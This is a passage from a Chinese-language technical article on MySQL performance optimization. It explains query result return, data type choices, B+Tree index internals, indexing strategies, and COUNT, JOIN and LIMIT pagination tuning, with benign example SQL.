段以后，MySQL会生成对应的执行计划，查询执行引擎根据执行计划给出的指令逐步执行得出结果。整个执行过程的大部分操作均是通过调用存储引擎实现的接口来完成，这些接口被称为,handler API,。查询过程中的每一张表由一个,handler,实例表示。实际上，MySQL在查询优化阶段就为每一张表创建了一个,handler,实例，优化器可以根据这些实例的接口来获取表的相关信息，包括表的所有列名、索引统计信息等。存储引擎接口提供了非常丰富的功能，但其底层仅有几十个接口，这些接口像搭积木一样完成了一次查询的大部分操作。,\n,返回结果给客户端,\n,查询执行的最后一个阶段就是将结果返回给客户端。即使查询不到数据，MySQL仍然会返回这个查询的相关信息，比如该查询影响到的行数以及执行时间等等。,\n,如果查询缓存被打开且这个查询可以被缓存，MySQL也会将结果存放到缓存中。,\n,结果集返回客户端是一个增量且逐步返回的过程。有可能MySQL在生成第一条结果时，就开始向客户端逐步返回结果集了。这样服务端就无须存储太多结果而消耗过多内存，也可以让客户端第一时间获得返回结果。需要注意的是，结果集中的每一行都会以一个满足①中所描述的通信协议的数据包发送，再通过TCP协议进行传输，在传输过程中，可能对MySQL的数据包进行缓存然后批量发送。,\n,回头总结一下MySQL整个查询执行过程，总的来说分为6个步骤：,\n,\n,客户端向MySQL服务器发送一条查询请求,\n,服务器首先检查查询缓存，如果命中缓存，则立刻返回存储在缓存中的结果。否则进入下一阶段,\n,服务器进行SQL解析、预处理、再由优化器生成对应的执行计划,\n,MySQL根据执行计划，调用存储引擎的API来执行查询,\n,将结果返回给客户端，同时缓存查询结果,\n,\n,性能优化建议,\n,看了这么多，你可能会期待给出一些优化手段，是的，下面会从3个不同方面给出一些优化建议。但请等等，还有一句忠告要先送给你：,不要听信你看到的关于优化的“绝对真理”，包括本文所讨论的内容，而应该是在实际的业务场景下通过测试来验证你关于执行计划以及响应时间的假设,。,\n,Scheme设计与数据类型优化,\n,选择数据类型只要遵循,小而简单,的原则就好，越小的数据类型通常会更快，占用更少的磁盘、内存，处理时需要的CPU周期也更少。越简单的数据类型在计算时需要更少的CPU周期，比如，整型就比字符操作代价低，因而会使用整型来存储ip地址，使用,DATETIME,来存储时间，而不是使用字符串。,\n,这里总结几个可能容易理解错误的技巧：,\n,\n,通常来说把可为,NULL,的列改为,NOT NULL,不会对性能提升有多少帮助，只是如果计划在列上创建索引，就应该将该列设置为,NOT NULL,。,\n,对整数类型指定宽度，比如,INT(11),，没有任何卵用。,INT,使用32位（4个字节）存储空间，那么它的表示范围已经确定，所以,INT(1),和,INT(20),对于存储和计算是相同的。,\n,UNSIGNED,表示不允许负值，大致可以使正数的上限提高一倍。比如,TINYINT,存储范围是-128 ~ 127，而,UNSIGNED TINYINT,存储的范围却是0 – 255。,\n,通常来讲，没有太大的必要使用,DECIMAL,数据类型。即使是在需要存储财务数据时，仍然可以使用,BIGINT,。比如需要精确到万分之一，那么可以将数据乘以一百万然后使用,BIGINT,存储。这样可以避免浮点数计算不准确和,DECIMAL,精确计算代价高的问题。,\n,TIMESTAMP,使用4个字节存储空间，,DATETIME,使用8个字节存储空间。因而，,TIMESTAMP,只能表示1970 – 2038年，比,DATETIME,表示的范围小得多，而且,TIMESTAMP,的值因时区不同而不同。,\n,大多数情况下没有使用枚举类型的必要，其中一个缺点是枚举的字符串列表是固定的，添加和删除字符串（枚举选项）必须使用,ALTER TABLE,（如果只只是在列表末尾追加元素，不需要重建表）。,\n,schema的列不要太多。原因是存储引擎的API工作时需要在服务器层和存储引擎层之间通过行缓冲格式拷贝数据，然后在服务器层将缓冲内容解码成各个列，这个转换过程的代价是非常高的。如果列太多而实际使用的列又很少的话，有可能会导致CPU占用过高。,\n,大表,ALTER TABLE,非常耗时，MySQL执行大部分修改表结果操作的方法是用新的结构创建一个张空表，从旧表中查出所有的数据插入新表，然后再删除旧表。尤其当内存不足而表又很大，而且还有很大索引的情况下，耗时更久。当然有一些奇技淫巧可以解决这个问题，有兴趣可自行查阅。,\n,\n,创建高性能索引,\n,索引是提高MySQL查询性能的一个重要途径，但过多的索引可能会导致过高的磁盘使用率以及过高的内存占用，从而影响应用程序的整体性能。应当尽量避免事后才想起添加索引，因为事后可能需要监控大量的SQL才能定位到问题所在，而且添加索引的时间肯定是远大于初始添加索引所需要的时间，可见索引的添加也是非常有技术含量的。,\n,接下来将向你展示一系列创建高性能索引的策略，以及每条策略其背后的工作原理。但在此之前，先了解与索引相关的一些算法和数据结构，将有助于更好的理解后文的内容。,\n,索引相关的数据结构和算法,\n,通常我们所说的索引是指,B-Tree,索引，它是目前关系型数据库中查找数据最为常用和有效的索引，大多数存储引擎都支持这种索引。使用,B-Tree,这个术语，是因为MySQL在,CREATE TABLE,或其它语句中使用了这个关键字，但实际上不同的存储引擎可能使用不同的数据结构，比如InnoDB就是使用的,B+Tree,。,\n,B+Tree,中的B是指,balance,，意为平衡。需要注意的是，B+树索引并不能找到一个给定键值的具体行，它找到的只是被查找数据行所在的页，接着数据库会把页读入到内存，再在内存中进行查找，最后得到要查找的数据。,\n,在介绍,B+Tree,前，先了解一下二叉查找树，它是一种经典的数据结构，其左子树的值总是小于根的值，右子树的值总是大于根的值，如下图①。如果要在这课树中查找值为5的记录，其大致流程：先找到根，其值为6，大于5，所以查找左子树，找到3，而5大于3，接着找3的右子树，总共找了3次。同样的方法，如果查找值为8的记录，也需要查找3次。所以二叉查找树的平均查找次数为(3 + 3 + 3 + 2 + 2 + 1) / 6 = 2.3次，而顺序查找的话，查找值为2的记录，仅需要1次，但查找值为8的记录则需要6次，所以顺序查找的平均查找次数为：(1 + 2 + 3 + 4 + 5 + 6) / 6 = 3.3次，因此大多数情况下二叉查找树的平均查找速度比顺序查找要快。,\n,\n,\n, ,\n,\n,\n,二叉查找树和平衡二叉树,\n,\n,由于二叉查找树可以任意构造，同样的值，可以构造出如图②的二叉查找树，显然这棵二叉树的查询效率和顺序查找差不多。若想二叉查找数的查询性能最高，需要这棵二叉查找树是平衡的，也即平衡二叉树（AVL树）。,\n,平衡二叉树首先需要符合二叉查找树的定义，其次必须满足任何节点的两个子树的高度差不能大于1。显然图②不满足平衡二叉树的定义，而图①是一课平衡二叉树。平衡二叉树的查找性能是比较高的（性能最好的是最优二叉树），查询性能越好，维护的成本就越大。比如图①的平衡二叉树，当用户需要插入一个新的值9的节点时，就需要做出如下变动。,\n,\n,\n, ,\n,\n,\n,平衡二叉树旋转,\n,\n,通过一次左旋操作就将插入后的树重新变为平衡二叉树是最简单的情况了，实际应用场景中可能需要旋转多次。至此我们可以考虑一个问题，平衡二叉树的查找效率还不错，实现也非常简单，相应的维护成本还能接受，为什么MySQL索引不直接使用平衡二叉树？,\n,随着数据库中数据的增加，索引本身大小随之增加，不可能全部存储在内存中，因此索引往往以索引文件的形式存储的磁盘上。这样的话，索引查找过程中就要产生磁盘I/O消耗，相对于内存存取，I/O存取的消耗要高几个数量级。可以想象一下一棵几百万节点的二叉树的深度是多少？如果将这么大深度的一颗二叉树放磁盘上，每读取一个节点，需要一次磁盘的I/O读取，整个查找的耗时显然是不能够接受的。那么如何减少查找过程中的I/O存取次数？,\n,一种行之有效的解决方法是减少树的深度，将二叉树变为m叉树（多路搜索树），而,B+Tree,就是一种多路搜索树。理解,B+Tree,时，只需要理解其最重要的两个特征即可：第一，所有的关键字（可以理解为数据）都存储在叶子节点（,Leaf Page,），非叶子节点（,Index Page,）并不存储真正的数据，所有记录节点都是按键值大小顺序存放在同一层叶子节点上。其次，所有的叶子节点由指针连接。如下图为高度为2的简化了的,B+Tree,。,\n,\n,\n, ,\n,\n,\n,简化B+Tree,\n,\n,怎么理解这两个特征？MySQL将每个节点的大小设置为一个页的整数倍（原因下文会介绍），也就是在节点空间大小一定的情况下，每个节点可以存储更多的内结点，这样每个结点能索引的范围更大更精确。所有的叶子节点使用指针链接的好处是可以进行区间访问，比如上图中，如果查找大于20而小于30的记录，只需要找到节点20，就可以遍历指针依次找到25、30。如果没有链接指针的话，就无法进行区间查找。这也是MySQL使用,B+Tree,作为索引存储结构的重要原因。,\n,MySQL为何将节点大小设置为页的整数倍，这就需要理解磁盘的存储原理。磁盘本身存取就比主存慢很多，在加上机械运动损耗（特别是普通的机械硬盘），磁盘的存取速度往往是主存的几百万分之一，为了尽量减少磁盘I/O，磁盘往往不是严格按需读取，而是每次都会预读，即使只需要一个字节，磁盘也会从这个位置开始，顺序向后读取一定长度的数据放入内存，预读的长度一般为页的整数倍。,\n,页是计算机管理存储器的逻辑块，硬件及OS往往将主存和磁盘存储区分割为连续的大小相等的块，每个存储块称为一页（许多OS中，页的大小通常为4K）。主存和磁盘以页为单位交换数据。当程序要读取的数据不在主存中时，会触发一个缺页异常，此时系统会向磁盘发出读盘信号，磁盘会找到数据的起始位置并向后连续读取一页或几页载入内存中，然后一起返回，程序继续运行。,\n,MySQL巧妙利用了磁盘预读原理，将一个节点的大小设为等于一个页，这样每个节点只需要一次I/O就可以完全载入。为了达到这个目的，每次新建节点时，直接申请一个页的空间，这样就保证一个节点物理上也存储在一个页里，加之计算机存储分配都是按页对齐的，就实现了读取一个节点只需一次I/O。假设,B+Tree,的高度为h，一次检索最多需要,h-1,次I/O（根节点常驻内存），复杂度O(h) = O(logmN)。实际应用场景中，M通常较大，常常超过100，因此树的高度一般都比较小，通常不超过3。,\n,最后简单了解下,B+Tree,节点的操作，在整体上对索引的维护有一个大概的了解，虽然索引可以大大提高查询效率，但维护索引仍要花费很大的代价，因此合理的创建索引也就尤为重要。,\n,仍以上面的树为例，我们假设每个节点只能存储4个内节点。首先要插入第一个节点28，如下图所示。,\n,\n,\n, ,\n,\n,\n,leaf page和index page都没有满,\n,\n,接着插入下一个节点70，在Index Page中查询后得知应该插入到50 – 70之间的叶子节点，但叶子节点已满，这时候就需要进行也分裂的操作，当前的叶子节点起点为50，所以根据中间值来拆分叶子节点，如下图所示。,\n,\n,\n,\n,\n,\n,Leaf Page拆分,\n,\n,最后插入一个节点95，这时候Index Page和Leaf Page都满了，就需要做两次拆分，如下图所示。,\n,\n,\n, ,\n,\n,\n,Leaf Page与Index Page拆分,\n,\n,拆分后最终形成了这样一颗树。,\n,\n,\n, ,\n,\n,\n,最终树,\n,\n,B+Tree,为了保持平衡，对于新插入的值需要做大量的拆分页操作，而页的拆分需要I/O操作，为了尽可能的减少页的拆分操作，,B+Tree,也提供了类似于平衡二叉树的旋转功能。当Leaf Page已满但其左右兄弟节点没有满的情况下，,B+Tree,并不急于去做拆分操作，而是将记录移到当前所在页的兄弟节点上。通常情况下，左兄弟会被先检查用来做旋转操作。就比如上面第二个示例，当插入70的时候，并不会去做页拆分，而是左旋操作。,\n,\n,\n, ,\n,\n,\n,左旋操作,\n,\n,通过旋转操作可以最大限度的减少页分裂，从而减少索引维护过程中的磁盘的I/O操作，也提高索引维护效率。需要注意的是，删除节点跟插入节点类似，仍然需要旋转和拆分操作，这里就不再说明。,\n,高性能策略,\n,通过上文，相信你对,B+Tree,的数据结构已经有了大致的了解，但MySQL中索引是如何组织数据的存储呢？以一个简单的示例来说明，假如有如下数据表：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nCREATE TABLE People(\r\n    last_name varchar(50) not null,\r\n    first_name varchar(50) not null,\r\n    dob date not null,\r\n    gender enum(`m`,`f`) not null,\r\n    key(last_name,first_name,dob)\r\n);\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,CREATE ,TABLE ,People,(,    ,last_name ,varchar,(,50,), ,not, ,null,,,    ,first_name ,varchar,(,50,), ,not, ,null,,,    ,dob ,date ,not, ,null,,,    ,gender ,enum,(,`,m,`,,,`,f,`,), ,not, ,null,,,    ,key,(,last_name,,,first_name,,,dob,),),;, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,对于表中每一行数据，索引中包含了last_name、first_name、dob列的值，下图展示了索引是如何组织数据存储的。,\n,\n,\n, ,\n,\n,\n,索引如何组织数据存储，来自：高性能MySQL,\n,\n,可以看到，索引首先根据第一个字段来排列顺序，当名字相同时，则根据第三个字段，即出生日期来排序，正是因为这个原因，才有了索引的“最左原则”。,\n,1、MySQL不会使用索引的情况：非独立的列,\n,“独立的列”是指索引列不能是表达式的一部分，也不能是函数的参数。比如：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nselect * from where id + 1 = 5\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,select *, ,from ,where ,id, ,+, ,1, ,=, ,5, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,我们很容易看出其等价于 id = 4，但是MySQL无法自动解析这个表达式，使用函数是同样的道理。,\n,2、前缀索引,\n,如果列很长，通常可以索引开始的部分字符，这样可以有效节约索引空间，从而提高索引效率。,\n,3、多列索引和索引顺序,\n,在多数情况下，在多个列上建立独立的索引并不能提高查询性能。理由非常简单，MySQL不知道选择哪个索引的查询效率更好，所以在老版本，比如MySQL5.0之前就会随便选择一个列的索引，而新的版本会采用合并索引的策略。举个简单的例子，在一张电影演员表中，在actor_id和film_id两个列上都建立了独立的索引，然后有如下查询：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nselect film_id,actor_id from film_actor where actor_id = 1 or film_id = 1\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,select ,film_id,,,actor_id ,from ,film_actor ,where ,actor_id, ,=, ,1, ,or, ,film_id, ,=, ,1, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,老版本的MySQL会随机选择一个索引，但新版本做如下的优化：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nselect film_id,actor_id from film_actor where actor_id = 1 \r\nunion all \r\nselect film_id,actor_id from film_actor where film_id = 1 and actor_id <> 1\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,select ,film_id,,,actor_id ,from ,film_actor ,where ,actor_id, ,=, ,1, ,union ,all ,select ,film_id,,,actor_id ,from ,film_actor ,where ,film_id, ,=, ,1, ,and, ,actor_id, ,<>, ,1, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,\n,当出现多个索引做相交操作时（多个AND条件），通常来说一个包含所有相关列的索引要优于多个独立索引。,\n,当出现多个索引做联合操作时（多个OR条件），对结果集的合并、排序等操作需要耗费大量的CPU和内存资源，特别是当其中的某些索引的选择性不高，需要返回合并大量数据时，查询成本更高。所以这种情况下还不如走全表扫描。,\n,\n,因此,explain,时如果发现有索引合并（Extra字段出现,Using union,），应该好好检查一下查询和表结构是不是已经是最优的，如果查询和表都没有问题，那只能说明索引建的非常糟糕，应当慎重考虑索引是否合适，有可能一个包含所有相关列的多列索引更适合。,\n,前面我们提到过索引如何组织数据存储的，从图中可以看到多列索引时，索引的顺序对于查询是至关重要的，很明显应该把选择性更高的字段放到索引的前面，这样通过第一个字段就可以过滤掉大多数不符合条件的数据。,\n,索引选择性,是指不重复的索引值和数据表的总记录数的比值，选择性越高查询效率越高，因为选择性越高的索引可以让MySQL在查询时过滤掉更多的行。唯一索引的选择性是1，这是最好的索引选择性，性能也是最好的。,\n,理解索引选择性的概念后，就不难确定哪个字段的选择性较高了，查一下就知道了，比如：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nSELECT * FROM payment where staff_id = 2 and customer_id = 584\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,SELECT *, ,FROM ,payment ,where ,staff_id, ,=, ,2, ,and, ,customer_id, ,=, ,584, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,是应该创建,(staff_id,customer_id),的索引还是应该颠倒一下顺序？执行下面的查询，哪个字段的选择性更接近1就把哪个字段索引前面就好。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nselect count(distinct staff_id)/count(*) as staff_id_selectivity,\r\n       count(distinct customer_id)/count(*) as customer_id_selectivity,\r\n       count(*) from payment\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,select ,count,(,distinct ,staff_id,),/,count,(,*,), ,as, ,staff_id_selectivity,,,       ,count,(,distinct ,customer_id,),/,count,(,*,), ,as, ,customer_id_selectivity,,,       ,count,(,*,), ,from ,payment, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,多数情况下使用这个原则没有任何问题，但仍然注意你的数据中是否存在一些特殊情况。举个简单的例子，比如要查询某个用户组下有过交易的用户信息：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nselect user_id from trade where user_group_id = 1 and trade_amount > 0\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,select ,user_id ,from ,trade ,where ,user_group_id, ,=, ,1, ,and, ,trade_amount, ,>, ,0, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,MySQL为这个查询选择了索引,(user_group_id,trade_amount),，如果不考虑特殊情况，这看起来没有任何问题，但实际情况是这张表的大多数数据都是从老系统中迁移过来的，由于新老系统的数据不兼容，所以就给老系统迁移过来的数据赋予了一个默认的用户组。这种情况下，通过索引扫描的行数跟全表扫描基本没什么区别，索引也就起不到任何作用。,\n,推广开来说，经验法则和推论在多数情况下是有用的，可以指导我们开发和设计，但实际情况往往会更复杂，实际业务场景下的某些特殊情况可能会摧毁你的整个设计。,\n,4、避免多个范围条件,\n,实际开发中，我们会经常使用多个范围条件，比如想查询某个时间段内登录过的用户：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nselect user.* from user where login_time > '2017-04-01' and age between 18 and 30;\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,select ,user,.,*, ,from ,user ,where ,login_time, ,>, ,'2017-04-01', ,and, ,age ,between, ,18, ,and, ,30,;, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,这个查询有一个问题：它有两个范围条件，login_time列和age列，MySQL可以使用login_time列的索引或者age列的索引，但无法同时使用它们。,\n,5、覆盖索引,\n,如果一个索引包含或者说覆盖所有需要查询的字段的值，那么就没有必要再回表查询，这就称为覆盖索引。覆盖索引是非常有用的工具，可以极大的提高性能，因为查询只需要扫描索引会带来许多好处：,\n,\n,索引条目远小于数据行大小，如果只读取索引，极大减少数据访问量,\n,索引是有按照列值顺序存储的，对于I/O密集型的范围查询要比随机从磁盘读取每一行数据的IO要少的多,\n,\n,6、使用索引扫描来排序,\n,MySQL有两种方式可以生产有序的结果集，其一是对结果集进行排序的操作，其二是按照索引顺序扫描得出的结果自然是有序的。如果explain的结果中,type,列的值为,index,表示使用了索引扫描来做排序。,\n,扫描索引本身很快，因为只需要从一条索引记录移动到相邻的下一条记录。但如果索引本身不能覆盖所有需要查询的列，那么就不得不每扫描一条索引记录就回表查询一次对应的行。这个读取操作基本上是随机I/O，因此按照索引顺序读取数据的速度通常要比顺序地全表扫描要慢。,\n,在设计索引时，如果一个索引既能够满足排序，又满足查询，是最好的。,\n,只有当索引的列顺序和,ORDER BY,子句的顺序完全一致，并且所有列的排序方向也一样时，才能够使用索引来对结果做排序。如果查询需要关联多张表，则只有,ORDER BY,子句引用的字段全部为第一张表时，才能使用索引做排序。,ORDER BY,子句和查询的限制是一样的，都要满足最左前缀的要求（有一种情况例外，就是最左的列被指定为常数，下面是一个简单的示例），其他情况下都需要执行排序操作，而无法利用索引排序。,\n,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n// 最左列为常数，索引：(date,staff_id,customer_id)\r\nselect  staff_id,customer_id from demo where date = '2015-06-01' order by staff_id,customer_id\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,// 最左列为常数，索引：(date,staff_id,customer_id),select  ,staff_id,,,customer_id ,from ,demo ,where ,date, ,=, ,'2015-06-01', ,order ,by ,staff_id,,,customer,_,id, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,\n,7、冗余和重复索引,\n,冗余索引是指在相同的列上按照相同的顺序创建的相同类型的索引，应当尽量避免这种索引，发现后立即删除。比如有一个索引,(A,B),，再创建索引,(A),就是冗余索引。冗余索引经常发生在为表添加新索引时，比如有人新建了索引,(A,B),，但这个索引不是扩展已有的索引,(A),。,\n,大多数情况下都应该尽量扩展已有的索引而不是创建新索引。但有极少情况下出现性能方面的考虑需要冗余索引，比如扩展已有索引而导致其变得过大，从而影响到其他使用该索引的查询。,\n,8、删除长期未使用的索引,\n,定期删除一些长时间未使用过的索引是一个非常好的习惯。,\n,关于索引这个话题打算就此打住，最后要说一句，索引并不总是最好的工具，只有当索引帮助提高查询速度带来的好处大于其带来的额外工作时，索引才是有效的。对于非常小的表，简单的全表扫描更高效。对于中到大型的表，索引就非常有效。对于超大型的表，建立和维护索引的代价随之增长，这时候其他技术也许更有效，比如分区表。最后的最后，,explain,后再提测是一种美德,。,\n,特定类型查询优化,\n,优化COUNT()查询,\n,COUNT(),可能是被大家误解最多的函数了，它有两种不同的作用，其一是统计某个列值的数量，其二是统计行数。统计列值时，要求列值是非空的，它不会统计NULL。如果确认括号中的表达式不可能为空时，实际上就是在统计行数。最简单的就是当使用,COUNT(*),时，并不是我们所想象的那样扩展成所有的列，实际上，它会忽略所有的列而直接统计行数。,\n,我们最常见的误解也就在这儿，在括号内指定了一列却希望统计结果是行数，而且还常常误以为前者的性能会更好。但实际并非这样，如果要统计行数，直接使用,COUNT(*),，意义清晰，且性能更好。,\n,有时候某些业务场景并不需要完全精确的,COUNT,值，可以用近似值来代替，EXPLAIN出来的行数就是一个不错的近似值，而且执行EXPLAIN并不需要真正地去执行查询，所以成本非常低。通常来说，执行,COUNT(),都需要扫描大量的行才能获取到精确的数据，因此很难优化，MySQL层面还能做得也就只有覆盖索引了。如果不还能解决问题，只有从架构层面解决了，比如添加汇总表，或者使用redis这样的外部缓存系统。,\n,优化关联查询,\n,在大数据场景下，表与表之间通过一个冗余字段来关联，要比直接使用,JOIN,有更好的性能。如果确实需要使用关联查询的情况下，需要特别注意的是：,\n,\n,确保,ON,和,USING,字句中的列上有索引。在创建索引的时候就要考虑到关联的顺序。当表A和表B用列c关联的时候，如果优化器关联的顺序是A、B，那么就不需要在A表的对应列上创建索引。没有用到的索引会带来额外的负担，一般来说，除非有其他理由，只需要在关联顺序中的第二张表的相应列上创建索引（具体原因下文分析）。,\n,确保任何的,GROUP BY,和,ORDER BY,中的表达式只涉及到一个表中的列，这样MySQL才有可能使用索引来优化。,\n,\n,要理解优化关联查询的第一个技巧，就需要理解MySQL是如何执行关联查询的。当前MySQL关联执行的策略非常简单，它对任何的关联都执行,嵌套循环关联,操作，即先在一个表中循环取出单条数据，然后在嵌套循环到下一个表中寻找匹配的行，依次下去，直到找到所有表中匹配的行为为止。然后根据各个表匹配的行，返回查询中需要的各个列。,\n,太抽象了？以上面的示例来说明，比如有这样的一个查询：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nSELECT A.xx,B.yy \r\nFROM A INNER JOIN B USING(c)\r\nWHERE A.xx IN (5,6)\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,SELECT, ,A,.,xx,,,B,.,yy ,FROM, ,A, ,INNER ,JOIN, ,B, ,USING,(,c,),WHERE, ,A,.,xx ,IN, ,(,5,,,6,), ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,假设MySQL按照查询中的关联顺序A、B来进行关联操作，那么可以用下面的伪代码表示MySQL如何完成这个查询：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nouter_iterator = SELECT A.xx,A.c FROM A WHERE A.xx IN (5,6);\r\nouter_row = outer_iterator.next;\r\nwhile(outer_row) {\r\n    inner_iterator = SELECT B.yy FROM B WHERE B.c = outer_row.c;\r\n    inner_row = inner_iterator.next;\r\n    while(inner_row) {\r\n        output[inner_row.yy,outer_row.xx];\r\n        inner_row = inner_iterator.next;\r\n    }\r\n    outer_row = outer_iterator.next;\r\n}\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,outer_iterator, ,=, ,SELECT, ,A,.,xx,,,A,.,c, ,FROM, ,A, ,WHERE, ,A,.,xx ,IN, ,(,5,,,6,),;,outer_row, ,=, ,outer_iterator,.,next,;,while,(,outer_row,), ,{,    ,inner_iterator, ,=, ,SELECT, ,B,.,yy ,FROM, ,B, ,WHERE, ,B,.,c, ,=, ,outer_row,.,c,;,    ,inner_row, ,=, ,inner_iterator,.,next,;,    ,while,(,inner_row,), ,{,        ,output,[,inner_row,.,yy,,,outer_row,.,xx,],;,        ,inner_row, ,=, ,inner_iterator,.,next,;,    ,},    ,outer_row, ,=, ,outer_iterator,.,next,;,}, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,可以看到，最外层的查询是根据,A.xx,列来查询的，,A.c,上如果有索引的话，整个关联查询也不会使用。再看内层的查询，很明显,B.c,上如果有索引的话，能够加速查询，因此只需要在关联顺序中的第二张表的相应列上创建索引即可。,\n,优化LIMIT分页,\n,当需要分页操作时，通常会使用,LIMIT,加上偏移量的办法实现，同时加上合适的,ORDER BY,字句。如果有对应的索引，通常效率会不错，否则，MySQL需要做大量的文件排序操作。,\n,一个常见的问题是当偏移量非常大的时候，比如：,LIMIT 10000 20,这样的查询，MySQL需要查询10020条记录然后只返回20条记录，前面的10000条都将被抛弃，这样的代价非常高。,\n,优化这种查询一个最简单的办法就是尽可能的使用覆盖索引扫描，而不是查询所有的列。然后根据需要做一次关联查询再返回所有的列。对于偏移量很大时，这样做的效率会提升非常大。考虑下面的查询：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nSELECT film_id,description FROM film ORDER BY title LIMIT 50,5;\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,SELECT ,film_id,,,description ,FROM ,film ,ORDER ,BY ,title ,LIMIT, ,50,,,5,;, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,如果这张表非常大，那么这个查询最好改成下面的样子：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nSELECT film.film_id,film.description\r\nFROM film INNER JOIN (\r\n    SELECT film_id FROM film ORDER BY title LIMIT 50,5\r\n) AS tmp USING(film_id);\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,SELECT ,film,.,film_id,,,film,.,description,FROM ,film ,INNER ,JOIN, ,(,    ,SELECT ,film_id ,FROM ,film ,ORDER ,BY ,title ,LIMIT, ,50,,,5,), ,AS, ,tmp ,USING,(,film_id,),;, 